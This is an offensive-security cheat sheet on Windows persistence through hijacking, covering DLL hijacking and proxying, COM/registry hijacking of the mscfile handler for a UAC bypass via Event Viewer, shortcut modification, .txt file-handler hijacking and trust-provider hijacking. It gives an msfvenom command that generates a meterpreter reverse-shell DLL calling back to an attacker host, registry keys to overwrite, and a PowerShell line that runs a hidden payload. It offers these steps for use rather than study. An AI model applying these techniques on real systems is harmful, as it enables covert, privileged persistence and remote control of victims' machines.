# Hijacking-Based Persistence

## DLL Hijacking / Proxying
- Find DLL search order gaps with Process Monitor (NAME NOT FOUND)
- Place malicious DLL in application directory before system directories
- Generate payload DLL: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f dll > evil.dll`
- DLL proxying: forward legitimate exports to original DLL while running payload

## COM Hijacking (T1122)
- Hijack: `HKLM\SOFTWARE\Classes\mscfile\shell\open\command` -> `powershell.exe`
- Launching Event Viewer (eventvwr.msc) triggers the hijacked COM object
- UAC bypass: eventvwr.exe auto-elevates, executes hijacked command as high integrity

## Shortcut (.lnk) Modification
```powershell
# Modify existing shortcut to run payload + original program
powershell.exe -c "invoke-item original.exe; invoke-item c:\payload.exe"
```
- Change shortcut icon back to original; set Run: Minimized to hide window

## File Extension Hijacking
- Hijack .txt handler: `HKCR\txtfile\shell\open\command`
- Change from `notepad.exe %1` to `c:\tools\shell.cmd %1`
- shell.cmd launches reverse shell AND opens file normally with notepad

## Trust Provider Hijacking
- Modify trust provider DLLs in registry to load malicious code during signature verification
